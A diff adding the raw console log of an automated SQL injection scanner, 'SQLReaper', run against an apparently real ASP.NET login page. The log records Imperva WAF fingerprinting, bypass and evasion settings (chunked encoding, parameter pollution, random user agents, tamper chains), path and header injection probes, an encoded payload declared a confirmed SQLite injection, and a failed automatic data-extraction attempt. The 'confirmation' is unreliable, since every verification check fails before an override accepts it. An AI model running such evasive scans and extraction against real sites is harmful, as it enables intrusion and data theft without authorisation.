@@ -1,0 +1,468 @@
+
+[+] [v21] Adaptive Extraction ENABLED (mutation_engine=SQLMutationEngine)
+[+] [v21]   Max bypasses: 10
+[+] [v21]   WAF threshold: 30%
+[+] [v21]   Max recovery attempts: 15
+
+============================================================
+[SQLReaper v25] Scan starting 02:15:24 url='/ADAC-Akademie/Viversa/Lo
+============================================================
+[+] [*] SQLReaper v26.0 starting — 6 DBMSes × 10 techniques × 300 payloads
+[+] [Estimate] 5 params  6 DBMS  ~21 techniques
+[+] [Estimate] ~819 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~10 minutes
+[*] Estimated scan time: 10m 55s (5 params × 6 DBMSes × 21 techniques, level=1)
+[+] [Session] Resuming from saved state: 0 params completed, dbms=PostgreSQL
+[+] ML WAF fingerprint: Imperva (conf=0.82)
+[+] ML WAF: Imperva
+[+] [v19] WAFMLBypassGenerator activated (WAF=Imperva, waf_bypass=5)
+[+] Safe-mode verification:
+ Ready to scan [oracle=differential]
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   Silent WAF detected  blocks SQL payloads with 200 status on clean
+[+] [OracleMode] Selected: differential
+[+] Pre-scan verification OK
+[+] Jitter profile: mean=0ms std=0ms p99=0ms min_sleep=3.0s
+[!] Jitter profile recommends SLEEP(3.0s) (target natural variance too high for 2.0s)
+[+] Auto-adjusted --time-sec to 3.0s
+[+] [v19] Oracle mode confirmed: differential
+[*] [diag-cascade] _v14_cascade entered: url='/ADAC-Akademie/Viversa/Login/Login.a'
+[+] KB tamper chain: ['space2newline', 'uppercase', 'commentbeforeparens', 'scientificnotation', 'hex_entities']
+[*] [diag-cascade] discovered params: ['path-injection'] markers=['path-injection']
+[*] Conformal calibration block complete, proceeding to causal discovery...
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+
+[*] ══════════════════════════════════════════════════════
+[*]  SCAN PLAN: 1 DBMS × 10 categories × 1 params × 3 methods
+[*]  DBMSes   : ['SQLite']
+[*]  Params   : ['path-injection']
+[*]  Categories: ['Boolean', 'Timebased', 'Error', 'Union', 'Stacked', 'Standard', 'Novel', 'WAFBypass', 'Exotic', 'Hybrid']
+[*]  Payloads  : 300 per DBMS×category at level 1 = 3000 total
+[*] ══════════════════════════════════════════════════════
+
+[+]  Endpoint [1/1]: GET /ADAC-Akademie/Viversa/Login/Login.aspx* (1 params, source=direct)
+[*] A/B detection profiling for 'path-injection'...
+[*] Stability profiling for 'path-injection'...
+[+] Stability profile: noise=low simhash_var=0.000 bool_thresh=0.150 timing_thresh=500ms
+[*] [Classify] 'path-injection'  static (no change on 3 simple probes)  testing anyway
+[!] [TimingCal] CDN-cached baseline (P95=0.0ms < 50ms) — baseline probes served from edge cache.  Injection payloads bypass CDN cache and hit backend directly.  Jitter profiler will refine sleep estimate against real backend latency.
+[+] [TimingCal] Baseline: median=0ms P95=0ms IQR=0ms  optimal SLEEP=1.0s
+[Gate]  All 12 optimizations enabled
+[*] [RateCalibrate] Probing rate limits on /ADAC-Akademie/Viversa/Login/Login.a...
+[*] [RateCalibrate] User specified --rpm 60, respecting user setting
+[*] [RateCalibrate] Completed
+[*] [RDF] Profiling server response to suspicious headers (6 probes)...
+[+] [RDF] Result: SILENT
+[+] [RDF] Headers: server ignores all input
+[+] Launching expanded surfaces in parallel (WAF: Imperva)
+[*] [diag-task] creating primary task: param='path-injection' orig='Login.aspx'
+[*] [HDR] Preparing 138 headers for batched scanning ( GET/POST/PUT  all techniques  all DBMS)...
+[*] [COOKIE] Probing for injectable cookies...
+[*] [COOKIE] No Set-Cookie headers in response  skipping cookie injection
+[*] [HDR] Scanning 138 headers in batches of 1...
+[*] [POST] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='POST:/ADAC-Akademie/Viversa/Login/Login.aspx*' params=['path-injection']
+[+] Scanning surface: 'POST:/ADAC-Akademie/Viversa/Login/Login.aspx*' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='path-injection' already_confirmed=False
+[*] --- testing 'path-injection' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*]   injection point: ...Login.aspxINJECT_HERE
+[*] Building baseline for 'path-injection'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='path-injection' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'path-injection'...
+[*] [PUT] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PUT:/ADAC-Akademie/Viversa/Login/Login.aspx*' params=['path-injection']
+[+] Scanning surface: 'PUT:/ADAC-Akademie/Viversa/Login/Login.aspx*' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='path-injection' already_confirmed=False
+[*] --- testing 'path-injection' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*]   injection point: ...Login.aspxINJECT_HERE
+[*] Building baseline for 'path-injection'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='path-injection' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'path-injection'...
+[*] [PATCH] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PATCH:/ADAC-Akademie/Viversa/Login/Login.aspx*' params=['path-injection']
+[+] Scanning surface: 'PATCH:/ADAC-Akademie/Viversa/Login/Login.aspx*' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='path-injection' already_confirmed=False
+[*] --- testing 'path-injection' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*]   injection point: ...Login.aspxINJECT_HERE
+[*] Building baseline for 'path-injection'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='path-injection' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'path-injection'...
+[*] [diag-surface] scan_surface called: surface='GET:/ADAC-Akademie/Viversa/Login/Login.aspx*' params=['path-injection']
+[+] Scanning surface: 'GET:/ADAC-Akademie/Viversa/Login/Login.aspx*' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='path-injection' already_confirmed=False
+[*] --- testing 'path-injection' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*]   injection point: ...Login.aspxINJECT_HERE
+[*] Building baseline for 'path-injection'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='path-injection' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'path-injection'...
+[*] [diag-surface] scan_surface called: surface='HDR:X-Forwarded-For:GET' params=['X-Forwarded-For']
+[+] Scanning surface: 'HDR:X-Forwarded-For:GET' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='X-Forwarded-For' already_confirmed=False
+[*] --- testing 'X-Forwarded-For' @ /ADAC-Akademie/Viversa/Login/Login.aspx*
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'X-Forwarded-For'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='X-Forwarded-For' gate_killed=False gate_circuit=False oracle=OracleMode.DIFFERENTIAL techniques=ALL
+[*] Cascade engine: testing 'X-Forwarded-For'...
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/1]: SQLite       | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] SQLite base_tech_map non-empty: {'B': 2390, 'BH': 2390, 'IN': 2390, 'BT': 2390, 'T': 2390, 'TH': 2390, 'HQ': 2390, 'E': 2390, 'EH': 2390, 'U': 2390, 'UE': 2390, 'UH': 2390, 'S': 2390, 'ST': 2390, 'NV': 2390, 'WB': 2390, 'EX': 2390, 'HY': 2390, 'SO': 2390}
+    [B] SQLite: 2390 payloads
+    [BH] SQLite: 2390 payloads
+    [IN] SQLite: 2390 payloads
+    [BT] SQLite: 2390 payloads
+    [T] SQLite: 2390 payloads
+    [TH] SQLite: 2390 payloads
+    [HQ] SQLite: 2390 payloads
+    [E] SQLite: 2390 payloads
+    [EH] SQLite: 2390 payloads
+    [U] SQLite: 2390 payloads
+    [UE] SQLite: 2390 payloads
+    [UH] SQLite: 2390 payloads
+    [S] SQLite: 2390 payloads
+    [ST] SQLite: 2390 payloads
+    [NV] SQLite: 2390 payloads
+    [WB] SQLite: 2390 payloads
+    [EX] SQLite: 2390 payloads
+    [HY] SQLite: 2390 payloads
+    [SO] SQLite: 2390 payloads
+[*] [diag] SQLite base_tech_map non-empty: {'B': 2390, 'BH': 2390, 'IN': 2390, 'BT': 2390, 'T': 2390, 'TH': 2390, 'HQ': 2390, 'E': 2390, 'EH': 2390, 'U': 2390, 'UE': 2390, 'UH': 2390, 'S': 2390, 'ST': 2390, 'NV': 2390, 'WB': 2390, 'EX': 2390, 'HY': 2390, 'SO': 2390}
+    [B] SQLite: 2390 payloads
+    [BH] SQLite: 2390 payloads
+    [IN] SQLite: 2390 payloads
+    [BT] SQLite: 2390 payloads
+    [T] SQLite: 2390 payloads
+    [TH] SQLite: 2390 payloads
+    [HQ] SQLite: 2390 payloads
+    [E] SQLite: 2390 payloads
+    [EH] SQLite: 2390 payloads
+    [U] SQLite: 2390 payloads
+    [UE] SQLite: 2390 payloads
+    [UH] SQLite: 2390 payloads
+    [S] SQLite: 2390 payloads
+    [ST] SQLite: 2390 payloads
+    [NV] SQLite: 2390 payloads
+    [WB] SQLite: 2390 payloads
+    [EX] SQLite: 2390 payloads
+    [HY] SQLite: 2390 payloads
+    [SO] SQLite: 2390 payloads
+[*] [diag] SQLite base_tech_map non-empty: {'B': 2390, 'BH': 2390, 'IN': 2390, 'BT': 2390, 'T': 2390, 'TH': 2390, 'HQ': 2390, 'E': 2390, 'EH': 2390, 'U': 2390, 'UE': 2390, 'UH': 2390, 'S': 2390, 'ST': 2390, 'NV': 2390, 'WB': 2390, 'EX': 2390, 'HY': 2390, 'SO': 2390}
+    [B] SQLite: 2390 payloads
+    [BH] SQLite: 2390 payloads
+    [IN] SQLite: 2390 payloads
+    [BT] SQLite: 2390 payloads
+    [T] SQLite: 2390 payloads
+    [TH] SQLite: 2390 payloads
+    [HQ] SQLite: 2390 payloads
+    [E] SQLite: 2390 payloads
+    [EH] SQLite: 2390 payloads
+    [U] SQLite: 2390 payloads
+    [UE] SQLite: 2390 payloads
+    [UH] SQLite: 2390 payloads
+    [S] SQLite: 2390 payloads
+    [ST] SQLite: 2390 payloads
+    [NV] SQLite: 2390 payloads
+    [WB] SQLite: 2390 payloads
+    [EX] SQLite: 2390 payloads
+    [HY] SQLite: 2390 payloads
+    [SO] SQLite: 2390 payloads
+[*] [diag] SQLite base_tech_map non-empty: {'B': 2390, 'BH': 2390, 'IN': 2390, 'BT': 2390, 'T': 2390, 'TH': 2390, 'HQ': 2390, 'E': 2390, 'EH': 2390, 'U': 2390, 'UE': 2390, 'UH': 2390, 'S': 2390, 'ST': 2390, 'NV': 2390, 'WB': 2390, 'EX': 2390, 'HY': 2390, 'SO': 2390}
+    [B] SQLite: 2390 payloads
+    [BH] SQLite: 2390 payloads
+    [IN] SQLite: 2390 payloads
+    [BT] SQLite: 2390 payloads
+    [T] SQLite: 2390 payloads
+    [TH] SQLite: 2390 payloads
+    [HQ] SQLite: 2390 payloads
+    [E] SQLite: 2390 payloads
+    [EH] SQLite: 2390 payloads
+    [U] SQLite: 2390 payloads
+    [UE] SQLite: 2390 payloads
+    [UH] SQLite: 2390 payloads
+    [S] SQLite: 2390 payloads
+    [ST] SQLite: 2390 payloads
+    [NV] SQLite: 2390 payloads
+    [WB] SQLite: 2390 payloads
+    [EX] SQLite: 2390 payloads
+    [HY] SQLite: 2390 payloads
+    [SO] SQLite: 2390 payloads
+[*] [diag] SQLite base_tech_map non-empty: {'B': 2390, 'BH': 2390, 'IN': 2390, 'BT': 2390, 'T': 2390, 'TH': 2390, 'HQ': 2390, 'E': 2390, 'EH': 2390, 'U': 2390, 'UE': 2390, 'UH': 2390, 'S': 2390, 'ST': 2390, 'NV': 2390, 'WB': 2390, 'EX': 2390, 'HY': 2390, 'SO': 2390}
+    [B] SQLite: 2390 payloads
+    [BH] SQLite: 2390 payloads
+    [IN] SQLite: 2390 payloads
+    [BT] SQLite: 2390 payloads
+    [T] SQLite: 2390 payloads
+    [TH] SQLite: 2390 payloads
+    [HQ] SQLite: 2390 payloads
+    [E] SQLite: 2390 payloads
+    [EH] SQLite: 2390 payloads
+    [U] SQLite: 2390 payloads
+    [UE] SQLite: 2390 payloads
+    [UH] SQLite: 2390 payloads
+    [S] SQLite: 2390 payloads
+    [ST] SQLite: 2390 payloads
+    [NV] SQLite: 2390 payloads
+    [WB] SQLite: 2390 payloads
+    [EX] SQLite: 2390 payloads
+    [HY] SQLite: 2390 payloads
+    [SO] SQLite: 2390 payloads
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] SQLite › Boolean    │ tech=B    │ 475 base payloads (2390 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] SQLite › Boolean    │ tech=B    │ 475 base payloads (2390 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] SQLite › Boolean    │ tech=B    │ 475 base payloads (2390 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] SQLite › Boolean    │ tech=B    │ 475 base payloads (2390 expanded)
+[*] │   Testing 19 technique codes in order: ['B', 'BH', 'IN', 'BT', 'T', 'TH', 'HQ', 'E', 'EH', 'U', 'UE', 'UH', 'S', 'ST', 'NV', 'WB', 'EX', 'HY', 'SO']
+[*] ├─ [1/10] SQLite › Boolean    │ tech=B    │ 475 base payloads (2390 expanded)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#1)
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#2)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#3)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#4)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#5)
+    [B-bool] [SQLite] 'X-Forwarded-For' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [SQLite] 'path-injection' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#2)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#6)
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#2)
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#7)
+    [B-bool] [SQLite] 'path-injection' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [SQLite] 'path-injection' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+    [B-bool] [SQLite] 'path-injection' req#1 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#2)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#8)
+[*]    Wasserstein comparison probe (param='path-injection' req#2)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#9)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#10)
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#11)
+[*]    Wasserstein comparison probe (param='path-injection' req#2)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#12)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#13)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#14)
+    [B-bool] [SQLite] 'path-injection' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#5)
+[+]   [Wasserstein] dist=0.6758 below threshold 0.50  not confirmed
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#15)
+    [B-bool] [SQLite] 'X-Forwarded-For' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#5)
+[+]   [Wasserstein] dist=0.6758 below threshold 0.50  not confirmed
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#16)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#17)
+    [B-bool] [SQLite] 'path-injection' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#5)
+[+]   [Wasserstein] dist=0.6758 below threshold 0.50  not confirmed
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#18)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#19)
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#20)
+    [B-bool] [SQLite] 'path-injection' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#5)
+[+]   [Wasserstein] dist=0.6758 below threshold 0.50  not confirmed
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#21)
+    [B-bool] [SQLite] 'path-injection' req#4 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#5)
+[+]   [Wasserstein] dist=0.6758 below threshold 0.50  not confirmed
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#22)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#23)
+    [B-bool] [SQLite] 'path-injection' req#7 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#8)
+[+]   [Wasserstein] dist=0.6758 below threshold 0.50  not confirmed
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#24)
+    [B-bool] [SQLite] 'X-Forwarded-For' req#7 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#8)
+[+]   [Wasserstein] dist=0.6758 below threshold 0.50  not confirmed
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#25)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#26)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#27)
+    [B-bool] [SQLite] 'path-injection' req#9 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*]    Wasserstein comparison probe (param='path-injection' req#10)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6758, threshold=0.50)  accepting boolean detection
+[*] Running PCV on B→B detection (SQLite)...
+    [B-bool] [SQLite] 'path-injection' req#7 sim=0.500 combined=0.700 thresh=0.850 (diff) DIFF
+[*] [diag] _try_technique: tech=B dbms=SQLite templates=2390 → testing 478 payloads
+[*]   [PCV] Using exact detection payload (bypass mutation for 100% reproduction)
+[*]   [PCV] Post-confirmation verification (3 checks with fallbacks)...
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] [diag] _try_technique: tech=B dbms=SQLite templates=2390 → testing 478 payloads
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] having: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] group_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] string_concat: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] numeric_where: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#28)
+[*] [diag] _try_technique: tech=B dbms=SQLite templates=2390 → testing 478 payloads
+[*]    Wasserstein comparison probe (param='path-injection' req#8)
+[*] [diag] _try_technique: tech=B dbms=SQLite templates=2390 → testing 478 payloads
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#29)
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#30)
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#31)
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] order_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#32)
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#33)
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#34)
+    [CTX-bool] limit_offset: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#35)
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[+] [DeobfDetect] WAF normalizes through: []
+[+] [DeobfDetect] Safe encoding layer: overlong_utf8
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#36)
+    [CTX-bool] where_equals: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#37)
+    [CTX-bool] having: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] having: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#38)
+    [CTX-bool] having: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#39)
+    [CTX-bool] group_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#40)
+    [CTX-bool] group_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] group_by: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='X-Forwarded-For' req#41)
+    [CTX-bool] string_concat: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] string_concat: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] string_concat: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+    [CTX-bool] numeric_where: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#42)
+    [CTX-bool] numeric_where: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#43)
+    [CTX-bool] numeric_where: sim_t=1.000 sim_f=1.000 gap=0.000 need=0.250  gap too small
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#44)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#45)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#46)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#47)
+[*]     Check A (body canary): FAIL (no-gap-above-threshold)
+[*]     Check C (error fingerprint): FAIL ()
+[*]     Check D (header diff): FAIL (0 diffs)
+[*] testing 'SQLite AND boolean-based blind' (param='path-injection' req#48)
+[*]     Check E (SQLite SQL/string): FAIL  inconsistent or no body change (1.000)
+[*]     Check B (timing canary): SKIPPED — skipped(non-timing tech=B, no SLEEP/WAITFOR in payload)
+[*]   [PCV] FP guards HIGH conf (1.000 >= 1.0) but Wasserstein (0.676 < 0.90) insufficient — RC-FINDING5-FP: single-pipeline signal without independent corroboration; Check A canary required for confirmation
+[*]   [PCV] Result: REJECTED  error page (404, 1245B) requires timing proof or strong body evidence, all checks failed
+[+] PCV FP-Guards WASSR OVERRIDE (det-notes) [B→B] SQLite det-time-dist=0.6758 ≥ 0.5000 (fp-preconf-conf>=1.0) — stored detection-time Wasserstein gap confirms injection (PCV canary probes WAF-blocked)
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[+] PCV CONFIRMED [B] SQLite  injection verified!
+
+[!!] SQL injection confirmed!
+    Parameter : 'path-injection'
+    URL       : /ADAC-Akademie/Viversa/Login/Login.aspx*
+    Technique : B
+    DBMS      : SQLite
+    Bypass    : none
+    Confidence: 89%
+    Payload   : 'Login&#x2e;aspx&#x2f;&#x2a;n&#x2a;&#x2f;A&#x2f;&#x2a;qlU&#x2a;&#x2f;&#x25;0ND   '
+    Requests  : 10
+
+[+] Vulnerability confirmed  param='path-injection' technique=B dbms=SQLite
+[+] Injection confirmed  cancelled 4 background tasks immediately
+[*] Injection confirmed on 'path-injection'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='path-injection'
+[*] Extraction started for 'path-injection'
+[+] BG injection confirmed  primary scan cancelled for fast extraction
+[+] Injection confirmed  cancelled remaining background scans
+[*] Collecting background surface results...
+[+] [BGExtraction] Recovered path-injection [B] SQLite from event
+[+] Minimising payload: 31 chars  ?
+[+] Minimised: 31  30 chars (16 probes)
+[+]  'path-injection': B [WHERE_STRING] bypass=none conf=89%
+[+] [PATCH-5] Second injection point param='path-injection' technique=B dbms=SQLite — logging only, extraction already active/done (Req 5).
+
+[!!] SQL injection confirmed!
+    Parameter : 'path-injection'
+    URL       : /ADAC-Akademie/Viversa/Login/Login.aspx*
+    Technique : B
+    DBMS      : SQLite
+    Bypass    : tamper:none
+    Confidence: 89%
+    Payload   : 'Login&#x2e;aspx&#x2f;&#x2a;n&#x2a;&#x2f;A&#x2f;&#x2a;qlU&#x2a;&#x2f;&#x25;0ND   '
+    Requests  : 0
+
+[!] [ExtractionGuard] Extraction already running on 'path-injection@SQLite@GET'  blocking parallel extraction of 'path-injection' (Issue 5 fix: never two extractions)
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete before exiting...
+[+] [V25-Extract] Inline boolean oracle wired (tech='B') — extraction can proceed despite ConditionalErrorOracle calibration failure
+[*] Using forced DBMS: SQLite (--dbms flag)
+[+] DBMS: SQLite  (conf=100%)
+[*] [MultiVector] Probing extraction methods for SQLite...
+[+] [MultiVector] Available methods (fastestslowest): boolean(blind), timing(blind)
+[+] --- Auto-extraction starting ---
+[+] [Inference] Detection payload: Login&#x2e;aspx&#x2f;&#x2a;n&#x2a;&#x2f;A&#x2f;&#x2a;qlU&#x2a;&#x2f;&#
+[+] [Inference] DBMS: SQLite | Tamper chain: ['hex_entities', 'unicode_fullwidth']
+[+] [Inference] PATH injection: stripping URL-encoding tampers to prevent double-encoding of SQL operators in URL path
+[+] [Inference] No sleep value in detection payload — falling back to 0.5s
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=0.5s)...
+[+] [Inference] Calibration 1: TRUE=318ms FALSE=59ms margin=260ms
+[+] [Inference] Best margin: 260ms
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Inference] Wasserstein mean=0.000 n=12 (threshold=0.25)
+[+] [Inference]  Threshold=189ms (margin=260ms)
+[!] [Inference] Timing oracle UNRELIABLE: margin=260ms < min=400ms (CDN noise exceeds injection signal — timing extraction skipped)
+[!] [Inference] BUG-V214-A FIX: all standard oracles failed for non-timing technique 'B' — attempting baseline-similarity oracle (CTX-bool style)
+[!] [Inference] Baseline-similarity oracle: sim_t=1.000 sim_f=1.000 gap=0.000
+[+] [Inference] No boolean oracle and timing unreliable  aborting extraction (re-run with longer sleep e.g. --time-sec 2 or wait for CDN cache expiry)
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
